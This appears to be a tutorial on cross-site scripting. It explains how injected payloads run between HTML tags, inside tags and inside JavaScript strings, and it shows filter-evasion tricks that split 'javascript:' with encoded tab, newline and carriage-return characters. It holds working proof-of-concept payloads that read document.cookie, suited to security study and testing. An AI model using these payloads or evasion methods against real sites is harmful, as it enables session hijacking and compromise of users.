# Context

The injected payload will most likely find its way within one of the following:

- **Between HTML tags**
- **Within HTML tags**
- **Inside JavaScript**

### XSS Between HTML Tags

When XSS happens between HTML tags, the attacker can run:
```html
<script>alert(document.cookie)</script>
```

### XSS Within HTML Tags

When the injection is within an HTML tag, we need to end the HTML tag to give the script a chance to load. We might adapt our payload to something like:
```html
><script>alert(document.cookie)</script>
```
or
```html
"><script>alert(document.cookie)</script>
```
or similar, depending on the context.

### XSS Inside JavaScript

If we need to terminate the script to run the injected one and inject our XSS within an existing JavaScript, we can start with `</script>` to end the current script and continue from there. If your code is within a JavaScript string, you can close the string with `'`, complete the command with a semicolon, execute your command, and comment out the rest of the line with `//`. For example:
```javascript
';alert(document.cookie)//.
```

This example shows different ways to escape the context your XSS payload is executing in. Generally speaking, understanding the context where your XSS payload runs is crucial for successful execution.

# Evasion

There are various repositories available for building custom XSS payloads, giving you plenty of room for experimentation. One such list is the **XSS Payload List**.

However, sometimes filters block XSS payloads. If there is a restriction based on the payload length, **Tiny XSS Payloads** can be a great starting point to bypass length limitations.

If XSS payloads are blocked by specific blocklists, there are several tricks for evasion. For instance, a horizontal tab, a new line, or a carriage return can break up the payload and bypass detection engines.

- **Horizontal tab (TAB)** is `9` in hexadecimal representation
- **New line (LF)** is `A` in hexadecimal representation
- **Carriage return (CR)** is `D` in hexadecimal representation

Based on the **XSS Filter Evasion Cheat Sheet**, we can break up the payload like so:
```html
<IMG SRC="javascript:alert('XSS');">
```

This can be evaded by breaking it up as follows:
```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

There are hundreds of evasion techniques, and the choice depends on the target security. It will often require trial and error to achieve a successful outcome.